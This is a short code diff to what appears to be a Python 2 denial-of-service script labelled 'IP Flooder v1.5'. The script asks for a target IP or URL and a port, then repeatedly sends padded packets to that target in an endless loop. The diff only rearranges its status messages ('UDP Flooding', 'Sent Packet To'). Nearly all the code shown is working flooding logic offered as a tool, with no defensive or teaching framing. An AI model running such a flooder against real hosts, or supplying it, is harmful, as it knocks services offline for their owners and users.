@@ -40,7 +40,7 @@ url = raw_input("[*] Target [IP/URL]: ")
 host = url.replace("http://", "").replace("https://", "").replace("http://www.", "").replace("https://www.", "").split('/')[0]
 buff = raw_input("[+] Messenger: ")
 port = input("[*] Port: ")
-
+print("\n[!] IP Flooder v1.5 | " +str(host)+ ":" +str(port)+ " UDP Flooding...")
 buff = time.ctime() + ": " + buff + " " * 1000
 
 while True:
@@ -49,8 +49,6 @@ while True:
         s.connect((host, port))
         s.send(buff)
         s.close()
-        #print ("[" + str(random.randint(0, 9)) + "]=>> Layer 4 - UDP Flood | Sent Packet To " + host + ":" + str(port) + " <<=[" + str(random.randint(0, 9)) + "]")
-        print ("[+]=>> Layer 4 - UDP Flood | Sent Packet To " + host + ":" + str(port) + " <<=[+]")
     except socket.error:
         s.close()
         print ("[!] System Timeout")
